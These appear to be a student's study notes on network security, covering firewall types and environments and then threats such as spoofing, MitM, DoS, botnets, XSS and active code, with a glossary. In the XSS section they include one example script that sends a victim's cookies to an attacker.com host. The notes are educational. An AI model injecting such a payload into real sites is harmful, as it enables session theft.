    *   Applicable even in **networks without direct internet connectivity** (e.g., segmenting internal networks).
    *   Operate at **multiple layers** of the network stack (OSI or TCP/IP model).
    *   Can function as **VPN (Virtual Private Network) gateways**, providing secure, encrypted connections over untrusted networks.
    *   Often incorporate **active content filtering** technologies (e.g., blocking malicious websites, spam filtering).

`[🔗 Connection]: Relates to network architecture, OSI model layers (Network, Transport, Session, Application), TCP/IP protocols, and VPN concepts (like IPsec).`


---

### **B. Firewall Environments**

*   Firewalls can be implemented in various network setups, from simple to complex.
*   **Simple Environment:** May involve a single firewall, often a **packet filter** type (e.g., basic router ACLs, personal firewall software).
*   **Complex Environment:** Can involve multiple firewalls, often of different types, working together with **proxies** to create layered security.

1.  **DMZ (Demilitarized Zone) Environment:**
    *   **Purpose:** To host publicly accessible servers (like web, email, DNS servers) in a separate, isolated network segment, protecting the internal private network.
    *   **Setup:** Typically created using **two firewalls** (or a single firewall with multiple interfaces configured correctly).
        *   **External Firewall/Boundary Router:** Faces the internet (ISP). Often performs initial **packet filtering** to block obviously malicious traffic before it reaches the DMZ servers. Protects the DMZ servers.
        *   **Internal Firewall:** Separates the DMZ from the internal protected network. Provides **stricter access control**. Protects the internal network *from* the DMZ (in case DMZ servers are compromised).
      ![[Pasted image 20250429022117.png]]
    * Shows ISP -> Boundary Router (Packet Filter) -> External DMZ Network (with External Web Server) -> Main Firewall -> Internal DMZ Network (optional layer) / Internal Protected Network (with Internal Email Server protected by Internal Firewall)
    *   `[Brief Summary]: A DMZ is a buffer zone between the untrusted internet and the trusted internal network, hosting public services while limiting risk to internal systems.`


2.  **VPN (Virtual Private Network) Environment:**
    *   **Purpose:** To provide **secure, encrypted network links** across untrusted networks (like the Internet).
    *   **Construction:** Built "on top of" existing network infrastructure using tunneling protocols and encryption.
    *   **Firewall Role:** Firewalls often act as **VPN gateways** or endpoints, terminating the VPN tunnel and decrypting traffic before passing it to the internal network (or vice versa).
    *   **Protocols:**
        *   **IPsec (Internet Protocol Security):** Common choice for network-layer VPNs. Provides authentication and encryption.
        *   Others: PPTP (Point-to-Point Tunneling Protocol), L2TP (Layer 2 Tunneling Protocol) - often used with IPsec for encryption.
    ![[Pasted image 20250429022139.png]]Shows a Firewall/VPN Server acting as an ISP Internet Gateway. Remote laptops connect via an encrypted tunnel (IPsec over TCP/IP) across the internet, logically extending the internal network to the remote users.]`


3.  **Intranets:**
    *   **Definition:** A **private network** within an organization that uses Internet technologies (TCP/IP protocols, web servers, email, etc.) for internal purposes **without necessarily involving external internet connectivity**.
    *   **Implementation:** Typically implemented **behind firewall environments** to segment and protect internal resources.
    *   `[🌍 Real-World Example/Application]: A company's internal employee portal, accessible only from within the company network.`

4.  **Extranets:**
    *   **Definition:** An extension of an intranet that allows **controlled access to external users** (e.g., business partners, suppliers, customers). Often described as a **business-to-business intranet**.
    *   **Access Control:** Relies on **authentication and encryption**, frequently provided by **VPNs** terminating at a firewall.
    *   **Technology:** Also uses standard TCP/IP protocols and applications.
    *  ![[Pasted image 20250429022158.png]] Shows two separate Protected Intranets (A and B), each behind its own Firewall (A and B). A VPN link connects the two firewalls across the "Internet Border," creating a shared Extranet between the two organizations.

**[Section Takeaway]:** Firewalls are deployed in diverse environments, from simple single-firewall setups to complex multi-firewall DMZs, VPN gateways, and configurations protecting Intranets and Extranets. The environment dictates the complexity and type of firewall(s) needed.

---

### **C. Types of Firewalls**

*   Firewalls are broadly categorized based on the network layer they operate at and the information they inspect.

1.  **Packet Filters (Stateless):**
    *   **Operation Layer:** **Network Layer** (Layer 3 OSI, IP Layer TCP/IP).
    *   **Mechanism:** Examines the header of each packet individually against a **set of rules (Access Control Lists - ACLs)**.
    *   **Criteria:** Rules based on **Source IP, Destination IP, Protocol (TCP, UDP, ICMP), Source Port, Destination Port, packet type**.
    *   **Decision:** Forwards or drops the packet based on the first matching rule.
    *   **Characteristics:**
        *   **Low cost** (often built into routers).
        *   **Low impact on network performance** (simple processing).
        *   **Stateless:** Doesn't track the state of connections. Each packet is judged independently. Makes it vulnerable to attacks that manipulate connection states (e.g., spoofed packets appearing mid-connection).
    *  ![[Pasted image 20250429022244.png]]Shows OSI layers. Incoming traffic hits Layer 3 (IP). Rules check IP/Port info. Allowed traffic proceeds up/out. Disallowed traffic is blocked. Note indicates filtering based on Source/Dest IP, packet type, Port number.
    *   `[💡 Mnemonic/Memory Aid]: Packet Filters are like **Bouncers checking IDs** (IPs/Ports) at the door, but they don't remember who they let in.`

2.  **Circuit-Level Gateways:**
    *   **Operation Layer:** **Session Layer** (Layer 5 OSI) or **Transport Layer** (TCP Layer TCP/IP).
    *   **Mechanism:** Monitors the **TCP handshaking** process (SYN, SYN-ACK, ACK) between packets to determine if a requested session is legitimate.
    *   **Function:** Acts as a relay. Once the handshake is approved, it creates a circuit (connection) and relays traffic between the trusted client and the untrusted server *without* inspecting the application content itself.
    *   **Characteristics:** Hides the internal network structure from the outside (address translation often involved). Generally faster than application-level gateways.
    ![[Pasted image 20250429022259.png]]Shows OSI layers. Filtering decision happens at Layer 4 (TCP). Note indicates filtering based on session rules (e.g., initiated by recognized computer). Allows traffic up to Layer 4.


3.  **Application-Level Gateways (Proxies):**
    *   **Operation Layer:** **Application Layer** (Layer 7 OSI).
    *   **Mechanism:** Acts as a **proxy** or intermediary for specific applications (e.g., HTTP proxy, FTP proxy, SMTP proxy). Understands the specific application protocol.
    *   **Function:** Client connects to the proxy; proxy establishes a separate connection to the destination server. It can inspect the **content** of the traffic for malicious payloads, enforce application-specific rules, perform caching, and log detailed information.
    *   **Characteristics:**
        *   **Application-specific:** A web proxy only handles web traffic (HTTP/S) and blocks others like FTP unless explicitly configured.
        *   **Highest level of security** (can understand application commands and data).
        *   **Can have significant performance impact** (deep inspection, two separate connections).
    ![[Pasted image 20250429022315.png]]Shows OSI layers. Filtering decision happens at Layer 5/7 (Application). Note indicates filtering based on application rules (browser, FTP, etc.). Allows traffic up to the Application layer.]`
    *   `[🌍 Real-World Example/Application]: A company web proxy that scans HTTP traffic for viruses and blocks access to social media websites.`
    *   `[💡 Mnemonic/Memory Aid]: Application Proxies are like **Specialized Translators** who understand the specific language (protocol) being spoken and can check the message content.`

4.  **Stateful Multilayer Inspection Firewalls:**
    *   **Operation Layer:** Operates across **multiple layers** (typically Network, Transport, and sometimes Application).
    *   **Mechanism:** **Combines aspects of the other three types.**
        *   Filters packets at the **Network Layer** (like packet filters).
        *   Tracks the **state of connections** (like circuit-level, but more sophisticated) – knows if a packet truly belongs to an established session.
        *   Can evaluate the **contents** of packets at the **Application Layer** for certain protocols (Deep Packet Inspection - DPI).
    *   **Characteristics:**
        *   **Most common modern firewall type.**
        *   Offers a **good balance of security and performance**.
        *   Maintains a **state table** to track active connections. Return traffic matching an entry in the state table is often allowed automatically, simplifying rule sets.
    *  ![[Pasted image 20250429022334.png]]Shows OSI layers. Check marks indicate filtering/inspection occurs at Layers 3, 4, and 5/7. Note indicates filtering at three levels based on application, session, and packet rules.
    *   `[Brief Summary]: Stateful firewalls remember active connections, making them smarter than basic packet filters, while often incorporating application awareness without the full overhead of a dedicated proxy for every protocol.`

5.  **Performance Summary:** `[Visual Description: Insert Table & Diagrams from slide 20]`
    *   **Packet Filtering:** Speed=Very Good, Flexibility=Very Good, Intelligence=Low.
    *   **Application Proxy:** Speed=Low, Flexibility=Low (protocol specific), Intelligence=Very Good.
    *   **Stateful Inspection:** Speed=Good, Flexibility=Good, Intelligence=Good.
    *   **Circuit Gateway:** Speed=Low, Flexibility=Low, Intelligence=Low.
    * Packet Filter > Stateful > App Proxy/Circuit) and Intelligence (App Proxy > Stateful > Packet Filter/Circuit)

**[Section Takeaway]:** Firewalls operate at different network layers, offering trade-offs between performance, flexibility, and security depth. Packet filters are fast but basic, proxies are secure but slow and specific, circuit-level focus on session legitimacy, and stateful inspection offers a balanced, common approach.

---

### **D. Future of Firewalls**

*   **Increasing Sophistication:** Firewalls will continue to evolve to counter **more advanced and sophisticated attacks** on IT infrastructure.
    *   `(Often called Next-Generation Firewalls - NGFW)`
*   **Native Proxy Support:** More client/server applications are being developed with **native support for proxied environments**, simplifying integration with application-level gateways.
*   **Integrated Threat Prevention:** Firewalls increasingly incorporate features beyond basic filtering:
    *   **Intrusion Prevention Systems (IPS):** Actively block detected threats.
    *   **Antivirus/Anti-malware Scanning:** Scan traffic for malicious payloads (idea is being explored but not yet universal or foolproof).
    *   **Application Control:** Identify and control specific applications (e.g., block BitTorrent, prioritize Salesforce).
    *   **User Identity Integration:** Base rules on user identity (e.g., Active Directory integration) rather than just IP addresses.
    *   **Cloud Integration:** Managing security policies across physical, virtual, and cloud environments.

---

### **E. Conclusion on Firewalls**

*   **Essential Security:** Some form of network security, often involving a firewall, is **essential** for any private network connected to the Internet (or even for internal segmentation).
*   **Part of a Strategy:** A firewall is a **critical and necessary component** of network security, but it **cannot perform all required security functions** on its own.
    *   `[Brief Summary]: Firewalls are a cornerstone, but not the entire building, of network security. They need to be part of a layered defense strategy (including endpoint security, user training, patching, etc.).`

---

## **Part 2: Security in Networks - Threats**

**(Structure based on slides 1-25 of the second presentation)**

---

### **A. Introduction to Network Threats**

*   Networks are vulnerable to various attacks that target confidentiality, integrity, and availability. Understanding these threats is crucial for implementing effective security controls (like firewalls, but also others).

---

### **B. Intelligence Gathering & Reconnaissance**

*   Attackers first try to gather information about the target.

1.  **Social Engineering:**
    *   **Definition:** Gathering sensitive information **directly from people** by manipulation.
    *   **Tactics:**
        *   Attacker pretends to be someone legitimate (e.g., IT support, colleague, manager).
        *   Exploits willingness to help ("I forgot my password, can you reset?") or creates a sense of urgency/authority.
        *   Phishing emails, pretext phone calls.
    *   `[🌍 Real-World Example/Application]: Calling an employee pretending to be help desk needing their password to fix an issue.`

2.  **Dumpster Diving:** Searching through trash for discarded documents, notes, manuals, or media containing sensitive information.
3.  **Eavesdropping (Oral):** Listening to conversations in person or over insecure communication channels (e.g., speakerphones).
4.  **Google Hacking (OSINT - Open Source Intelligence):**
    *   Using search engines (like Google) to find sensitive information unintentionally exposed on the internet.
    *   Exploiting specific search queries ("Google dorks") to find configuration files, login pages, error messages, documents.

**[Section Takeaway]:** Attackers often start by gathering information using non-technical (social engineering, dumpster diving) or publicly available technical means (Google hacking).

---

### **C. Eavesdropping & Wiretapping**

*   Intercepting communications as they flow through the network.

1.  **Node Monitoring:** The legitimate owner/administrator of a network node (router, server) can always monitor traffic passing through it.
2.  **Passive Wiretapping (Eavesdropping):** Monitoring communication without modification.
3.  **Active Wiretapping:** Intercepting and **modifying or fabricating** communication.
4.  **Link Eavesdropping:** Tapping into the physical communication medium. Vulnerability depends on the medium:
    *   **Copper Cable:**
        *   **Inductance:** Can sometimes eavesdrop without physical contact if close enough (rarely practical).
        *   **Splicing:** Cutting the cable and adding a secondary tap is feasible but requires physical access and effort.
    *   **Optical Fiber:**
        *   **No Inductance:** Cannot passively tap via inductance.
        *   **Splicing:** Possible but likely **detectable** due to signal loss.
        *   **Fiber Bending:** Bending the fiber sharply can cause light leakage (<1%) which can be captured by a sensitive detector. Requires precise physical access. ![[Pasted image 20250429022503.png]] 
        * showing a micro-bend clamp, optical detector, and converter connected to a laptop tapping an active fiber cable.
    *   **Microwave/Satellite:** Signal path can be wide; attacker near the receiver might eavesdrop. Requires specialized equipment.
    *   **WiFi (Wireless):**
        *   **Easily intercepted** by anyone nearby with a standard Wi-Fi device (laptop, phone) in promiscuous mode.
        *   **No additional hardware** needed, raising less suspicion.
        *   Can be intercepted from far away (**kilometers**) using directional antennas.
        *   **Raises other issues:** Need for **authentication** (prevent free riders) and **encryption** (prevent eavesdropping). Physical walls offer little protection.

5.  **Misdelivered Information:**
    *   **LANs:** Due to technical reasons (e.g., broadcast domains, hub behavior), packets might be sent to multiple nodes, not just the intended one. Network interface cards (NICs) normally ignore packets not addressed to them, but **packet sniffers** put the NIC in **promiscuous mode** to capture *all* packets.
    *   **Email:** Wrongly addressed emails, accidental "Reply-To-All" expose information.
    *   `[🌍 Real-World Example/Application]: Using Wireshark on an open Wi-Fi network to capture unencrypted login credentials.`

**[Section Takeaway]:** Communications can be intercepted physically (tapping copper/fiber/wireless) or logically (sniffing on LANs). Wireless is particularly vulnerable. Encryption is the primary defense against eavesdropping.

---

### **D. Impersonation & Masquerading**

*   An attacker pretending to be a legitimate user, device, or service.

1.  **User Impersonation (Password Theft):**
    *   **Guessing:** Brute-force or dictionary attacks.
    *   **Default Passwords:** Exploiting unchanged default credentials.
    *   **Sniffing:** Capturing passwords sent unencrypted over the network.
    *   **Social Engineering:** Tricking users into revealing passwords.
2.  **Exploiting Trust Relationships:**
    *   **Machine/Account Trust:** Systems like `rhosts`/`rlogin` or `shosts`/`slogin` (older Unix mechanisms) allowed users from trusted hosts to log in without a password. If an attacker compromises the trusted machine (Y), they can access the target machine (X) as the legitimate user.
    *   **Masquerading as a Machine:** Attacker might spoof the IP/MAC address of a trusted machine.

**[Section Takeaway]:** Attackers can impersonate users by stealing credentials or exploit pre-configured trust relationships between systems.

---

### **E. Spoofing**

*   An object (node, person, URL, webpage, email, AP) masquerading as another. A specific form of impersonation often involving network protocols.

1.  **URL Spoofing:** Making a malicious website URL look like a legitimate one.
    *   **Typosquatting:** `www.uwaterlo.ca` vs `www.uwaterloo.ca`.
    *   **Ambiguities/Homographs:** `www.foobar.com` vs `www.foo-bar.com`; using similar-looking characters from different alphabets (IDN homograph attack).
    *   **Similarities:** `www.paypa1.com` vs `www.paypal.com`.
    *   **Used in Phishing:** Directs users to fake login pages.
2.  **Web Page Spoofing:** Creating a fake website that looks identical to a legitimate one. Used with URL spoofing in Phishing.
3.  **"Evil Twin" Attack:** Setting up a rogue Wi-Fi Access Point with the same name (SSID) as a legitimate one (e.g., "University Wi-Fi"). Unsuspecting users connect to the evil twin, allowing the attacker to intercept traffic (Man-in-the-Middle).
4.  **Other Spoofing:** IP address spoofing, MAC address spoofing, email sender spoofing. Used in various attacks including DoS, session hijacking, etc.

**[Section Takeaway]:** Spoofing tricks users or systems into trusting a malicious entity by making it look like a legitimate one. Common in phishing and Wi-Fi attacks.

---

### **F. Session Hijacking & Man-in-the-Middle (MitM)**

1.  **Session Hijacking:**
    *   **Context:** Protocols like TCP establish a **stateful session** between endpoints (using sequence numbers, ports, etc.).
    *   **Attack:** Attacker takes over an established session, kicking off the legitimate user and masquerading as them. Often involves predicting or sniffing TCP sequence numbers.
    *   **Web Cookies:** Web servers use cookies to maintain state. Attackers can **sniff or steal cookies** (e.g., via XSS or network sniffing) and use them to impersonate the user's logged-in session.
2.  **Man-in-the-Middle (MitM) Attack:**
    *   **Attack:** Attacker secretly positions themselves **between two communicating parties**, intercepting, potentially modifying, and relaying messages. The parties believe they are communicating directly.
    *   **Difference from Hijacking:** In MitM, the attacker is an **intermediate node**, not pretending to be an endpoint. Often involves ARP spoofing or DNS poisoning to redirect traffic through the attacker. Evil Twin AP is a form of MitM.

**[Section Takeaway]:** Attackers can take over existing communication sessions or insert themselves in the middle to intercept or modify traffic.

---

### **G. Traffic Flow Analysis**

*   **Problem:** Sometimes, the **mere existence of communication** between two parties is sensitive, even if the content is encrypted (e.g., whistleblower contacting journalist, two CEOs discussing merger, military communications).
*   **Mechanism:** TCP/IP packets contain **source and receiver IP addresses** in the header. Attackers can **sniff packets** (even encrypted ones) and learn who is talking to whom.
*   **Defense:** Technologies like Tor or VPNs that obscure the true source/destination addresses (discussed later).

**[Section Takeaway]:** Analyzing traffic patterns (who talks to whom, when, how much) can reveal sensitive information even without decrypting content.

---

### **H. Integrity Attacks**

*   Modifying data in transit or at rest.

1.  **Packet Modification:** Attacker intercepts and modifies packets:
    *   Change payload.
    *   Change source/destination address.
    *   Replay previously captured packets.
    *   Delete or create packets.
    *   `[Note]: Line noise/errors can also cause these issues, but TCP/IP checksums usually detect *accidental* corruption. Checksums are often easy for an *active attacker* to recalculate after modification, making them ineffective against deliberate tampering.`
2.  **DNS Cache Poisoning:**
    *   **Context:** DNS maps hostnames (www.example.com) to IP addresses (93.184.216.34). Systems cache these mappings.
    *   **Attack:** Attacker tricks a DNS server or client into caching an **incorrect mapping**, redirecting traffic intended for a legitimate site to a malicious one. Can lead to phishing or MitM.

**[Section Takeaway]:** Attackers can violate data integrity by modifying packets directly or by corrupting mapping information like DNS records.

---

### **I. Protocol Failures**

*   Exploiting weaknesses or flaws in protocol design or implementation.

1.  **Ignoring Protocol Rules:** TCP/IP assumes nodes behave correctly. E.g., TCP uses congestion control signals; an attacker could simply **ignore requests to slow down**, contributing to network congestion (DoS).
2.  **Poor Implementation / Malformed Packets:** Some implementations don't properly validate packet formatting.
    *   Incorrect length fields could lead to **buffer overflows**.
    *   Vulnerabilities common across implementations using the same codebase.
3.  **Complexity:** Complex protocols may have undefined or ambiguous behavior in rare cases, which can be exploited.
4.  **Broken Security Mechanisms:** Some protocols include security features that are later found to be fundamentally flawed (e.g., **WEP** encryption in early Wi-Fi).

**[Section Takeaway]:** Network protocols themselves, or their implementations, can contain vulnerabilities that attackers exploit.

---

### **J. Web Site Vulnerabilities**

*   Exploiting flaws in web servers, web applications, or related technologies.

1.  **Examining Code:** Attackers examine HTML source code, JavaScript, etc., returned by the server to find vulnerabilities (e.g., exposed parameters, logic flaws).
2.  **Web Site Defacement:** Modifying the visual appearance of a website.
3.  **Crafting Malicious URLs/Input:** Sending specially crafted requests to the web server to:
    *   Exploit **buffer overflows** in the server software.
    *   Invoke a **shell** or other programs on the server.
    *   Feed malicious input to **server-side scripts** (e.g., SQL Injection).
    *   Access sensitive files via **directory traversal** (`../`).
    *   Compose URLs different from those intended by the application logic.
4.  **State Modification:** HTTP is stateless; state is often maintained via cookies or URL parameters (e.g., `?clientId=4342`). Attackers can try to **modify this state information** to gain unauthorized access or impersonate others.
5.  **Cross-Site Scripting (XSS):**
    *   **Attack:** Attacker injects **malicious script code** (e.g., JavaScript) into a web page that is then viewed by other users.
    *   **Mechanism:** Often via input fields like comment sections, forums, profile details. The website improperly validates/sanitizes the input and includes the script in the page served to others.
    *   **Impact:** The script executes in the victim's browser context, allowing the attacker to steal cookies, hijack sessions, redirect users, display fake content, etc.
    *   `[🌍 Real-World Example/Application]: Injecting `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` into a blog comment.`

**[Section Takeaway]:** Web applications are complex and prone to various vulnerabilities, including input validation errors (XSS, SQLi), logic flaws, and information exposure.

---

### **K. Denial of Service (DoS) & Distributed DoS (DDoS)**

*   Attacks aimed at making a service or resource unavailable to legitimate users.

1.  **Physical:** Cutting wires, jamming wireless signals.
2.  **Flooding / Overloading:** Overwhelming a node's resources:
    *   **Bandwidth:** Sending more traffic than its internet connection can handle.
    *   **Processing Capacity:** Sending requests that consume excessive CPU or memory.
3.  **Ping Flood:** Overloading a victim by sending numerous ICMP Echo Request ("ping") packets, forcing the victim to generate replies. (`Ping of Death` was different - a malformed packet that crashed older systems).
4.  **Smurf Attack (Amplification Attack):** Sending ping requests to a network's broadcast address with the **source IP spoofed** to be the victim's address. All nodes on the broadcast network reply to the victim, amplifying the flood. (Largely mitigated now).
5.  **SYN Flood:**
    *   **Mechanism:** Exploits the TCP three-way handshake (SYN, SYN-ACK, ACK). Attacker sends many **SYN packets** (often with spoofed source IPs) but **never sends the final ACK**.
    *   **Impact:** The server queues these half-open connections, consuming resources (memory/TCB entries). Legitimate SYN requests may be dropped if the queue is full.
6.  **Exploiting Implementation Details:** Using knowledge of specific software/hardware to craft requests that perform poorly (e.g., forcing hash table collisions).
7.  **Fragmentation Attacks:** Sending malformed packet fragments that cannot be reassembled properly, consuming resources or potentially crashing the system.
8.  **Black Hole Attack:**
    *   **Mechanism:** Exploits routing protocols. A malicious router falsely advertises a very low-cost route to the victim destination. Other routers send traffic for the victim to the malicious router, which then **discards (drops) the packets**.
    *   **Cause:** Can be deliberate or due to router misconfiguration.
9.  **DNS Attacks:** DNS cache poisoning can redirect traffic away from the intended server (DoS). Overloading DNS servers makes name resolution fail.
10. **Distributed Denial of Service (DDoS):**
    *   **Problem:** A single attacker is easier to identify and block. DDoS uses **many attacking machines** simultaneously.
    *   **Botnets:** Attackers compromise numerous machines (often user PCs, IoT devices) using Trojans, worms, etc., installing malicious software (**bots** or **zombies**).
    *   **Control:** The network of bots (**botnet**) is controlled remotely by the attacker ("botmaster"). Bots wait for commands to launch attacks (DDoS, spam, etc.).
    *   **Difficulty:** Hard to trace back to the actual attacker. Turning off a botnet is difficult due to distributed/redundant control, stealth techniques used by bots.
    *   **Botnet Sophistication:** Modern botnets use advanced techniques: multiple exploits for propagation, stealth, code morphing (evade AV), dynamic control.
    *   **Motivation:** Early worms (Nimda, Slammer) spread for **fame**. Modern botnets are often rented out for **profit** by criminal organizations.
    *   **Scale:** Botnets like Storm Worm were estimated to include millions of machines.
    *   `[💡 Mnemonic/Memory Aid]: DDoS = **D**istributed **D**evices **o**verwhelm **S**ervice.`
    *   `[❓ Potential Exam Question]: Explain the difference between DoS and DDoS. How are botnets used in DDoS attacks?`

**[Section Takeaway]:** DoS/DDoS attacks aim to disrupt service availability through various means, from physical attacks to protocol exploits and large-scale floods orchestrated by botnets.

---

### **L. Active Code & Mobile Code**

*   Code transferred from a server to be executed on a client machine.

1.  **Purpose:** Reduce load on server, provide richer client-side functionality (Java, JavaScript, ActiveX). Can also invoke other applications (Word, iTunes).
2.  **Dangers:** Code executed on the client can be dangerous:
    *   Consume excessive CPU/memory (DoS).
    *   Display unwanted content, play annoying music.
    *   Exploit vulnerabilities in the browser or OS.
    *   Access local files or resources (if permissions allow).
    *   Inadvertent execution (e.g., via XSS).
3.  **Security Mechanisms & Flaws:**
    *   **Java (Early versions - 1.1):** Ran in a **sandbox** with limited capabilities (no file writing, limited network access). Code checked for correctness. Still vulnerable to resource exhaustion DoS.
    *   **JavaScript:** Similar sandbox concept, primarily runs within the browser context. Vulnerable via XSS, browser exploits.
    *   **Java (Later versions - 1.2+):** Can **break out of sandbox** if **approved by the user**. Problem: Users often click "allow" without understanding the risk.
    *   **ActiveX (Microsoft):**
        *   **No sandbox** or correctness check by default.
        *   Relies on **cryptographic signatures**. Downloaded code is signed; signature is verified against a list of "trusted" entities before execution. Problem: Trust model can be flawed (attacker steals signing key, user trusts malicious entity).
    *   **Third-Party Applications:** Browser plugins, helper applications (Word, PDF readers) can be invoked by web content. These applications often have full access rights and can be exploited via malicious input parameters (e.g., Word macros).

**[Section Takeaway]:** Executing code downloaded from a server (Active Code) poses significant risks to the client. Sandboxing helps but isn't foolproof, and signature-based trust models have weaknesses.

## **Glossary**


*   **AES (Advanced Encryption Standard):** Strong symmetric block cipher, standard for WPA2.
*   **AP (Access Point):** Device allowing wireless devices to connect to a wired network.
*   **Botnet:** A network of compromised computers (bots/zombies) controlled remotely.
*   **Cipher Suite:** A negotiated set of algorithms used for authentication, encryption, and integrity in protocols like TLS.
*   **C&C (Command and Control):** Server infrastructure used by attackers to manage botnets.
*   **DMZ (De-Militarized Zone):** A buffer network between internal and external networks.
*   **DDoS (Distributed Denial of Service):** DoS attack from multiple sources.
*   **DoS (Denial of Service):** Attack to make a service unavailable.
*   **DLP (Data Loss Prevention):** Technology to prevent sensitive data exfiltration.
*   **DNS (Domain Name System):** Translates domain names to IP addresses.
*   **Encryption:** Process of converting data into a coded form to prevent unauthorized access.
*   **Firewall:** Network security device filtering traffic based on rules.
*   **Honeypot:** Decoy system to attract and study attackers.
*   **HTTP (Hypertext Transfer Protocol):** Protocol for web communication.
*   **HTTPS (HTTP Secure):** HTTP encrypted using SSL/TLS.
*   **ICMP (Internet Control Message Protocol):** Used for network diagnostics (e.g., Ping).
*   **IDS (Intrusion Detection System):** Monitors for malicious activity and alerts.
*   **IPS (Intrusion Prevention System):** Active IDS that can block threats.
*   **IPSec (Internet Protocol Security):** Protocol suite for securing IP communications (often for VPNs).
*   **IV (Initialization Vector):** Random or pseudo-random number used with a key for encryption; WEP's small, predictable IVs were a major flaw.
*   **MAC (Message Authentication Code / Message Integrity Code - MIC):** Cryptographic checksum ensuring data integrity and authenticity.
*   **NAT (Network Address Translation):** Technique to map private IPs to public IPs.
*   **OSI Model:** A conceptual framework for network communication layers.
*   **Port Scanning:** Probing a host for open ports/services.
*   **Proxy (Application-Level Gateway):** Firewall type acting as intermediary for specific applications.
*   **PSK (Pre-Shared Key):** Shared secret used for authentication/encryption (e.g., WPA-Personal).
*   **RADIUS:** Centralized authentication server often used with WPA-Enterprise.
*   **RC4:** Stream cipher used by WEP (flawed implementation).
*   **Replay Attack:** Attack involving re-sending previously captured valid data.
*   **SIEM (Security Information and Event Management):** System for aggregating and analyzing security logs.
*   **Sniffer (Packet Sniffer):** Tool to capture network traffic.
*   **Spoofing:** Masquerading as another entity (IP spoofing, DNS spoofing).
*   **SSH (Secure Shell):** Protocol for secure remote login and tunneling.
*   **SSID (Service Set Identifier):** Name of a WiFi network.
*   **SSL (Secure Sockets Layer):** Predecessor to TLS.
*   **SYN Flood:** DoS attack exploiting the TCP handshake.
*   **TCP (Transmission Control Protocol):** Connection-oriented transport protocol.
*   **TKIP (Temporal Key Integrity Protocol):** WPA protocol improving WEP security (now largely superseded by AES).
*   **TLS (Transport Layer Security):** Modern protocol for securing communications (successor to SSL).
*   **Tor (The Onion Router):** Anonymity network using onion routing.
*   **UDP (User Datagram Protocol):** Connectionless transport protocol.
*   **VPN (Virtual Private Network):** Creates a secure tunnel over a public network.
*   **WEP (Wired Equivalent Privacy):** Deprecated and insecure WiFi security protocol.
*   **WPA/WPA2/WPA3 (WiFi Protected Access):** Modern WiFi security protocols.
*   **802.11:** IEEE standard for Wireless Local Area Networks (WLANs).
*   **ACK (Acknowledgement):** A control frame sent by a receiver to confirm successful reception of a unicast frame.
*   **Ad hoc Network (IBSS):** A BSS without an AP, where stations communicate directly.
*   **AP (Access Point):** A device connecting a wireless BSS to a wired Distribution System.
*   **Baseband Layer (Bluetooth):** Layer managing physical links, FHSS, TDD, framing.
*   **BSS (Basic Service Set):** The basic building block of an 802.11 network.
*   **Bluetooth:** A short-range, ad hoc wireless technology (PAN).
*   **CCK (Complementary Code Keying):** Modulation technique used in 802.11b.
*   **CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance):** MAC protocol used in 802.11 DCF.
*   **CTS (Clear to Send):** A control frame sent by a receiver in response to an RTS, silencing hidden stations.
*   **DCF (Distributed Coordination Function):** Contention-based MAC mechanism in 802.11 using CSMA/CA.
*   **DIFS (DCF Interframe Space):** The time a station waits before transmitting under DCF when the medium is idle.
*   **DS (Distribution System):** The backbone network connecting APs in an ESS.
*   **DSSS (Direct Sequence Spread Spectrum):** Physical layer technique spreading the signal across a wide frequency band.
*   **ESS (Extended Service Set):** A network formed by multiple BSSs connected via a DS.
*   **Exposed Station Problem:** A station unnecessarily defers transmission because it hears another transmission that would not actually interfere with its intended receiver.
*   **FC (Frame Control):** Field in 802.11 frames containing control subfields.
*   **FCS (Frame Check Sequence):** Error detection field (CRC) in 802.11 frames.
*   **FHSS (Frequency Hopping Spread Spectrum):** Physical layer technique rapidly changing transmission frequency. Used in legacy 802.11 and Bluetooth.
*   **Hidden Station Problem:** Two stations cannot hear each other but can both communicate with a third station (e.g., AP), potentially causing collisions at the third station.
*   **IBSS (Independent BSS):** See Ad hoc Network.
*   **IEEE (Institute of Electrical and Electronics Engineers):** Standards body.
*   **IFS (Interframe Space):** Time intervals (SIFS, PIFS, DIFS) used in 802.11 MAC to control access.
*   **Infrastructure Network:** A BSS that includes an AP connected to a DS.
*   **ISM Bands (Industrial, Scientific, Medical):** Unlicensed radio frequency bands.
*   **L2CAP (Logical Link Control and Adaptation Protocol):** Bluetooth layer for multiplexing, segmentation, and QoS.
*   **MAC (Media Access Control):** Sublayer of the Data Link Layer controlling access to the physical medium.
*   **NAV (Network Allocation Vector):** A timer used by 802.11 stations to defer access based on overheard RTS/CTS duration information.
*   **OFDM (Orthogonal Frequency Division Multiplexing):** Modulation technique used in 802.11a/g/n/ac/ax, dividing data across many subcarriers.
*   **PCF (Point Coordination Function):** Optional contention-free MAC mechanism in 802.11 using polling.
*   **Piconet:** Basic Bluetooth network (1 Primary, up to 7 active Secondaries).
*   **PIFS (PCF Interframe Space):** IFS used by PCF, shorter than DIFS.
*   **Primary (Bluetooth):** The controlling node in a Piconet.
*   **Profiles (Bluetooth):** Define standard implementations for specific Bluetooth use cases.
*   **PSK (Phase Shift Keying):** A digital modulation scheme.
*   **Radio Layer (Bluetooth):** Layer defining the air interface (frequency, modulation).
*   **RTS (Request to Send):** A control frame sent by a transmitter to reserve the medium before sending data.
*   **Scatternet:** A network formed by interconnecting Bluetooth Piconets.
*   **Secondary (Bluetooth):** A node in a Piconet controlled by the Primary.
*   **SIFS (Short Interframe Space):** The shortest IFS, used for high-priority frames like ACKs and CTS.
*   **STA (Station):** Any device with an 802.11 interface.
*   **TDD (Time Division Duplex):** Access method where Primary and Secondary transmit in alternating time slots (used in Bluetooth).
*   **WLAN (Wireless Local Area Network):** A LAN implemented without wires, typically using Wi-Fi (802.11).
* *   **ACL (Access Control List):** Set of rules used by packet filters.
*   **Active Code:** Code transferred from server to client for execution (Java, JS, ActiveX).
*   **ActiveX:** Microsoft framework for downloadable code components; relies on digital signatures.
*   **Application-Level Gateway (Proxy):** Firewall operating at Layer 7, understanding specific application protocols.
*   **Bot/Zombie:** A compromised computer controlled remotely in a botnet.
*   **Botnet:** A network of compromised computers (bots) used for malicious activities (DDoS, spam).
*   **Buffer Overflow:** Writing data beyond the allocated buffer memory, potentially overwriting critical data or executing malicious code.
*   **Circuit-Level Gateway:** Firewall operating at Layer 5/TCP Layer, validating TCP handshakes.
*   **Cookie:** Small piece of data stored by a web browser, used by websites to maintain state.
